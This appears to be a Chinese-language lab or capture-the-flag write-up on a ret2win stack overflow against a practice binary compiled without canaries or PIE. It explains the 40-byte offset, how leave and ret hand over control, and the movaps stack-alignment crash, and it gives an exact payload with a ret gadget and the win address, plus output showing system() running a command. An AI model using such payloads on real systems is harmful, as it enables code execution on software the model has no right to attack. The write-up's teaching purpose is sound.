# 02 - stack-align

## 一、漏洞在哪

`vuln()` 里 `memcpy(buf, line, 64)` 把 64 字节写进只有 18 字节的 `buf`，`buf` 后面的 46 字节会盖掉 `saved rbp` 和 `saved rip`。

> 本题用 `read` 而不是 `strcpy`：`strcpy` 遇到 `\0` 就停止，
> 地址是 8 字节，高 5 位是 0，strcpy 写到第一个 0 就停，第二个地址永远塞不进去。

## 二、为什么能利用

### 2.1 栈布局

实测（gdb）：
- `&buf = 0x7fffffffdcf0`
- `$rbp = 0x7fffffffdd10`

```
地址            内容              说明
──────────────────────────────────────────────────
0x...dcf0      AAAA...           ← buf 起点
   ...         （32 字节）
0x...dd0f      A                 ← buf 末尾
──────────────────────────────────────────────────
0x...dd10      [ saved rbp ]     ← rbp 指向这里
0x...dd18      [ saved rip ]     ← 返回地址
0x...dd20      [ 下一个槽 ]
```

偏移 = (0xdd10 − 0xdcf0) + 8 = 0x20 + 8 = **40**

### 2.2 leave; ret 到底做了什么

`leave` 是两条指令：
```
mov rsp, rbp      ① rsp 拉到 rbp
pop rbp           ② 弹出 saved rbp，rsp +8 → 指向 saved rip
```

`ret` 是一条：
```
pop rip           ③ 把 saved rip 里的值当作下一条指令地址
```

| 步 | 指令 | rsp | rip |
|---|---|---|---|
| ① | `mov rsp,rbp` | 0xdd10 | — |
| ② | `pop rbp` | 0xdd18 | — |
| ③ | `pop rip` | 0xdd20 | **[0xdd18] 的值** |

**结论：往 0xdd18 写什么，程序就跳到哪。**

### 2.3 直接跳为什么崩

x86-64 的约定：`call` 之前 `rsp` 必须能被 16 整除。

`call` 自己压 8 字节，所以**正常进函数时 `rsp` 余 8**。

我们是 `ret` 进去的，`ret` 只弹不压：
```
情况 A：ret 之后 rsp = 0xdd20，除以 16 余 0   ← 少了 8，歪了
```

`win` 里调用 `system()`，而 `system` 内部有 `movaps`，
movaps 要求地址是 16 的倍数，歪了就 SIGSEGV。

所以直接跳 → `SIGSEGV`，且看不到 `uid=`。

### 2.4 加一个 ret 为什么就好了

```
情况 B：ret 之后 rsp = 0xdd20（余 0）
        gadget 再 pop 一次 → rsp = 0xdd28（余 8）← 正了
        然后跳到 [0xdd20] = win
```

gadget 就是**多弹一次栈**，把缺的那 8 字节补回来。

### 2.5 为什么 01 不用 gadget

printf 的代码路径里没有 movaps；system 里有。01 不是对齐没坏，是没踩到雷。

## 三、payload 怎么构造

```
偏移 0  ~ 39    "A" × 40          填充
偏移 40 ~ 47    0x40101a          ret gadget
偏移 48 ~ 55    0x4011b6          win
```

写完整 8 字节的原因：read 按字节读、不认 \0，所以能塞完整地址。

脚本对比：

```
[直接跳]   (-11, '')
[加gadget] (0, 'uid=1001(sunziyi) gid=1002(sunziyi) groups=1002(sunziyi),27(sudo)')
```

## 四、防护为什么没起作用

| 保护 | 状态 | 后果 |
|---|---|---|
| 栈金丝雀 | `-fno-stack-protector` 关闭 | 溢出不会被检测到 |
| PIE | `-no-pie` 关闭 | 地址固定，可以写死 |
